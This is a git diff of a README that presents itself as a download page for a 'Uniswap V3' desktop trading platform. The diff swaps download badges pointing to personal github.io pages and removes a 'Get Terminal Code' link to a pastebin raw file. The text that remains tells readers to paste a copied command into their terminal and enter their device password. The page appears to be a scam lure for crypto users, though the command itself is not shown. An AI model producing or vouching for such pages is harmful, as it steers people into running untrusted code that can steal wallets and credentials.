@@ -1,19 +1,8 @@
-# Uniswap LP V3 – The Ultimate Professional DeFi Trading Platform
-
-<div align="center">
-
-![Uniswap Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Uniswap_Logo_and_Wordmark.svg/2560px-Uniswap_Logo_and_Wordmark.svg.png)
-
-</div>  
+# Uniswap LP V3 – The Ultimate Professional DeFi Trading Platform 
 
 Uniswap V3 Download provides the complete desktop interface for Ethereum's most powerful decentralized exchange. Access concentrated liquidity features, advanced analytics, and multi-chain swapping.
 
-<div align="center">  
-
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://nelsonsarah19712691.github.io/.github/uniswap-v3/)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://nelsonsarah19712691.github.io/.github/uniswap-v3/)  
-
-</div>  
+[![Explore Uniswap V3 DeFi](https://img.shields.io/badge/Explore-Uniswap%20V3%20DeFi-DB2777?style=flat-square)](https://uniswap-v3-defi.github.io/.github/)
 
 ---  
 
@@ -63,9 +52,6 @@ What truly sets Uniswap V3 apart is its ambitious multi-chain architecture. Whil
 ### Installation via a command in the terminal:
 
 1. Click on the "Get terminal code" button and copy the installation command there.
-
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/eCk7JejB)
-
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation. 
 
